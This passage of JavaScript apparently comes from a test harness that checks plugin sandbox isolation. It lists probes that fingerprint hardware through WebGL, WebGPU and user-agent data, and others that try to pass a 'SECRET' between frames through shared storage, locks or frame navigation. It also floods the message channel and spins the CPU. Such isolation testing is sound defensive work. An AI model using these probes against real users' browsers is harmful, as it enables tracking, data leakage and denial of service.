        navigator.hid
          ? navigator.hid.getDevices().then(
              (all) => `hid answered: ${all.length}`,
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'bluetooth-devices',
      'machine',
      false,
      () =>
        navigator.bluetooth?.getDevices
          ? navigator.bluetooth.getDevices().then(
              (all) => `bluetooth answered: ${all.length}`,
              (error) => `refused: ${error.name}`,
            )
          : 'no such API',
    ],
    [
      'webgpu-adapter',
      'machine',
      false,
      async () => {
        if (!navigator.gpu) return 'no such API'
        const adapter = await navigator.gpu.requestAdapter()
        if (!adapter) return 'refused: no adapter'
        return `adapter: ${adapter.info?.vendor ?? '?'} ${adapter.info?.architecture ?? ''} ${adapter.info?.description ?? ''}`
      },
    ],
    [
      'canvas-webgl-names',
      'machine',
      false,
      () => {
        if (typeof OffscreenCanvas === 'undefined') return 'no such API'
        const gl = new OffscreenCanvas(16, 16).getContext('webgl')
        if (!gl) return 'refused: no WebGL'
        const names = gl.getExtension('WEBGL_debug_renderer_info')
        return `card: ${names ? gl.getParameter(names.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)}`
      },
    ],
    [
      'canvas-2d-draws',
      'machine',
      false,
      async () => {
        if (typeof OffscreenCanvas === 'undefined') return 'no such API'
        const canvas = new OffscreenCanvas(204, 68)
        const context = canvas.getContext('2d')
        context.fillStyle = '#2675d3'
        context.fillRect(0, 0, 204, 68)
        context.font = '13px sans-serif'
        context.fillText('drawn in the worker', 8, 24)
        const bitmap = canvas.transferToImageBitmap()
        return `drew ${bitmap.width}×${bitmap.height}`
      },
    ],
    [
      'canvas-webgl-loses-context',
      'machine',
      false,
      async () => {
        if (typeof OffscreenCanvas === 'undefined') return 'no such API'
        const canvas = new OffscreenCanvas(16, 16)
        const gl = canvas.getContext('webgl')
        if (!gl) return 'refused: no WebGL'
        const lose = gl.getExtension('WEBGL_lose_context')
        lose?.loseContext()
        return `context lost on purpose: ${gl.isContextLost()} (only its own)`
      },
    ],
    [
      'webcodecs',
      'machine',
      false,
      () => `VideoEncoder: ${typeof VideoEncoder}, ImageDecoder: ${typeof ImageDecoder}`,
    ],
    [
      'pressure-observer',
      'machine',
      false,
      () => {
        if (typeof PressureObserver === 'undefined') return 'no such API'
        return new Promise((done) => {
          const observer = new PressureObserver((records) =>
            done(`load read: ${records[0]?.state}`),
          )
          observer.observe('cpu').then(
            () => setTimeout(() => done('observing, nothing read yet'), 1200),
            (error) => done(`refused: ${error.name}`),
          )
        })
      },
    ],
    [
      'storage-estimate-persist',
      'machine',
      false,
      async () => {
        if (!navigator.storage?.estimate) return 'no such API'
        const estimate = await navigator.storage.estimate()
        return `quota ${estimate.quota}, persisted ${navigator.storage.persist ? await navigator.storage.persist() : 'n/a'}`
      },
    ],
    [
      'user-agent-data',
      'machine',
      false,
      () =>
        navigator.userAgentData?.getHighEntropyValues
          ? navigator.userAgentData
              .getHighEntropyValues(['platformVersion', 'model', 'fullVersionList'])
              .then((values) => `read: platform ${values.platformVersion}`)
          : 'no such API',
    ],

    // --- Two frames at once: one plugin to another, or one load to the next ---
    [
      'pair-broadcast',
      'pair',
      false,
      (c) => {
        const channel = new BroadcastChannel('lumovi-pair')
        if (c.role === 'second') {
          channel.postMessage('SECRET')
          return 'posted'
        }
        return new Promise((done) => {
          channel.onmessage = () => done('HEARD the other frame')
          setTimeout(() => done('heard nothing'), 1400)
        })
      },
    ],
    [
      'pair-locks',
      'pair',
      false,
      (c) => {
        if (!navigator.locks) return 'no such API'
        if (c.role === 'first')
          return navigator.locks
            .request('lumovi-pair', () => wait(1300))
            .then(
              () => 'held a lock',
              (error) => `refused: ${error.name}`,
            )
        return navigator.locks
          .request('lumovi-pair', { ifAvailable: true }, (lock) =>
            lock ? 'lock was free: not shared' : 'SAW the other frame’s lock',
          )
          .catch((error) => `refused: ${error.name}`)
      },
    ],
    [
      'pair-cache',
      'pair',
      false,
      async (c) => {
        if (!self.caches) return 'no such API'
        const cache = await caches.open('lumovi-pair')
        if (c.role === 'first') {
          await cache.put('https://kept.other.test/kept', new Response('SECRET'))
          return 'wrote'
        }
        return (await cache.match('https://kept.other.test/kept'))
          ? 'READ what the other frame wrote'
          : 'found nothing'
      },
    ],
    [
      'pair-indexeddb',
      'pair',
      false,
      (c) =>
        new Promise((done) => {
          const request = indexedDB.open('lumovi-pair', 1)
          request.onupgradeneeded = () => request.result.createObjectStore('s')
          request.onerror = () => done('refused: error event')
          request.onsuccess = () => {
            const store = request.result.transaction('s', 'readwrite').objectStore('s')
            if (c.role === 'first') {
              store.put('SECRET', 'k')
              done('wrote')
            } else {
              const got = store.get('k')
              got.onsuccess = () =>
                done(got.result ? 'READ what the other frame wrote' : 'found nothing')
            }
          }
          setTimeout(() => done('no event'), 900)
        }),
    ],
    [
      'pair-frames-reach',
      'pair',
      true,
      (c) => {
        if (c.role === 'first')
          return new Promise((done) => {
            addEventListener('message', (event) => {
              if (event.data === 'from-the-other-frame') done('HEARD the other frame’s message')
            })
            setTimeout(() => done('heard nothing'), 1400)
          })
        let said = ''
        for (let i = 0; i < parent.frames.length; i++) {
          try {
            parent.frames[i].postMessage('from-the-other-frame', '*')
            said += ` posted to ${i};`
          } catch (error) {
            said += ` ${i} threw ${error.name};`
          }
          try {
            if (parent.frames[i] !== window) {
              parent.frames[i].location = c.leak
              said += ` navigated ${i};`
            }
          } catch (error) {
            said += ` navigate ${i} threw ${error.name};`
          }
        }
        return said
      },
    ],

    // --- The channel itself: what a flood or a huge message costs the page ---
    [
      'port-flood',
      'port',
      false,
      (c) => {
        for (let i = 0; i < 100000; i++) c.post({ noise: 'x'.repeat(200), i })
        return 'posted 100,000 messages'
      },
    ],
    [
      'port-huge',
      'port',
      false,
      (c) => {
        c.post({ noise: new Uint8Array(512 * 1024 * 1024) })
        return 'posted 512 MB, copied'
      },
    ],
    [
      'port-deep',
      'port',
      false,
      (c) => {
        let deep = {}
        const top = deep
        for (let i = 0; i < 20000; i++) {
          deep.next = {}
          deep = deep.next
        }
        c.post({ noise: top })
        return 'posted an object 20,000 deep'
      },
    ],
    [
      'spin',
      'port',
      false,
      () => {
        const until = Date.now() + 1200
        while (Date.now() < until);
        return 'spun the processor for 1.2 s'
      },
    ],
  ]

  self.ATTEMPTS = list
    .filter(([, , needsDom]) => hasDom || !needsDom)
    .map(([id, group, needsDom, run]) => ({ id, group, needsDom, run }))
  self.ATTEMPT_IDS = list.map(([id, group, needsDom]) => ({ id, group, needsDom }))
  // (An address is given per try, so each has a host name of its own to be looked up by.)
  /** One way out, tried: what the code saw of it. */
  self.runAttempt = async (id, context) => {
    const attempt = self.ATTEMPTS.find((entry) => entry.id === id)
    if (!attempt) return 'not possible here: there is no page'
    try {
      const saw = await Promise.race([
        attempt.run(context),
        new Promise((done) => setTimeout(() => done('no answer'), 1800)),
      ])
      return String(saw).slice(0, 200)
    } catch (error) {
      return `threw ${error?.name}: ${error?.message}`.slice(0, 200)
    }
  }
})()
